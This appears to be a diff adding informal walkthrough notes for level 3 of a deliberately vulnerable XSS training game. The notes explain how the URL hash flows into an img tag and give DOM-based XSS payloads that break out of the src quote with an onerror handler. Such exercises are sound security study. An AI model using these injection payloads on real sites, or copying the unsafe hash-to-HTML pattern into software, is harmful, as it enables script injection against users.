@@ -1,0 +1,51 @@
+https://xss-game.appspot.com/level3
+
+
+After reviewing the source code, notice the image request location ?
+
+now use frame#' onerror="alert('hello')"> at the url
+
+
+add a # at the url before <img> (url becomes /frame#<img>)
+
+function chooseTab(num) {
+  var html = "Image " + parseInt(num) + "<br>";
+  html += "<img src='/static/level3/cloud" + num + ".jpg' />";
+  $('#tabContent').html(html);
+}
+
+the <+num+> is where your input goes
+
+
+
+function chooseTab(num) {
+  var html = "Image " + parseInt(num) + "<br>";
+  html += "<img src='/static/level3/cloud" + num + ".jpg' />";
+  $('#tabContent').html(html);
+}
+And this line:
+
+window.onload = function() { 
+  chooseTab(unescape(self.location.hash.substr(1)) || "1");
+}
+
+So whatever is after # in the URL becomes num
+
+
+
+From this line:
+
+html += "<img src='/static/level3/cloud" + num + ".jpg' />";
+
+
+If your input is 3, it builds:
+
+<img src='/static/level3/cloud3.jpg' />
+
+
+BUT if your input is something malicious, like:
+
+<img src='' onerror="alert('1')">
+
+also, note the ' at src ?
+Do not use " for src
